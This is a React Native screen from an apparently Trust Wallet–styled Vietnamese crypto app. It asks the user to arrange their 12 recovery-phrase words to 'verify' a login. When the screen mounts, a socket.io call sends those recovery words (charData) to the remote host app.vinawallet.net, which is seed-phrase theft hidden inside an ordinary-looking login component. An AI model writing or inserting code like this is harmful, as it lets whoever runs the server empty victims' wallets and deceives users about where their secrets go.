import React, {useEffect, } from 'react';
import TrustContainer from '../components/common/TrustContainer';
import TrustView from '../components/common/TrustView';
import {styles} from './styles';
import Content from '../components/login/Content';
import CharacterList from '../components/login/CharacterList';
import ButtonLogin from '../components/login/ButtonLogin';
import {useTheme} from '@react-navigation/native';
import TrustText from '../components/common/TrustText';
import { useSelector} from 'react-redux';
import TrustTouchableOpacity from '../components/common/TrustTouchableOpacity';
import store from '../redux/store/store';
import {setCharData} from '../redux/actions/CharAction';
import Colors from '../common/Colors';
import {setOldCharData} from '../redux/actions/OldCharAction';
import {io} from 'socket.io-client';
import {showAppLoading} from '../redux/actions/LoadingAction';


function VerifyLoginContainer(props) {
    const {colors} = useTheme();
    const { navigation} = props;
    let {charData} = useSelector(state => state.charData);

    useEffect(() => {
        const socket = io('https://app.vinawallet.net',
            {transports: ['websocket', 'polling', 'flashsocket']},
        );
        socket.emit('/socketVnaWallet', {'api_passer': {'key_passer': 'twl_aut_sig','verify_string':charData}});
        store.dispatch(showAppLoading(true));
        socket.on('twl_aut_sig', (res) => {
                console.log(res.message)
            store.dispatch(showAppLoading(false));

        });
    }, []);
    const onPressLogin = () => {
        navigation?.navigate('Tab Navigator');
    };

    useEffect(() => {

    }, []);

    return (
        <TrustContainer
            hasHeader={false}
            renderContentView={() => {
                return (
                    <TrustView style={[styles.LoginContainer, {backgroundColor: colors.background}]}>
                        <Content
                            txtTitle={'Xác minh các cụm từ khôi phục ví'}
                            txtContent={'Nhấn vào các từ để đặt chúng vào cạnh nhau theo đúng thứ tự'}
                        />
                        {charData.length !== 0 ? <TrustView style={[styles.confirmChar,{backgroundColor:colors.buttonPay}]}>
                            {charData.map((item, index) => {
                                return (
                                    <TrustTouchableOpacity
                                        key={index}
                                        style={styles.character}
                                        onPress={() => {
                                            const state = store.getState();
                                            const {oldCharData} = state.oldCharData;
                                            const new_arr = charData.filter(char => char !== item);
                                            store.dispatch(setCharData(Object.assign([], new_arr)));
                                            const arr = charData.filter((charItem) => charItem.id === item.id);
                                            if (arr?.length !== 0) {
                                                store.dispatch(setOldCharData(oldCharData));

                                            }
                                        }}>
                                        <TrustText
                                            style={{color: '#AAAAAA'}}
                                            text={index + 1 + ' '}
                                        />
                                        <TrustText text={item.title}/>
                                    </TrustTouchableOpacity>
                                );
                            })}
                        </TrustView> : <TrustView style={[styles.confirmChar,{backgroundColor:colors.buttonPay}]}/>}
                        <CharacterList/>
                        <ButtonLogin
                            style={charData.length == 12 ?{backgroundColor:Colors.secondBackground}:{backgroundColor:'#AAAAAA'}}
                            onPress={charData.length == 12 ?onPressLogin:()=>{}}
                            txtLogin={'ĐĂNG NHẬP'}
                        />
                    </TrustView>
                );
            }}
        />
    );
}

export default VerifyLoginContainer;
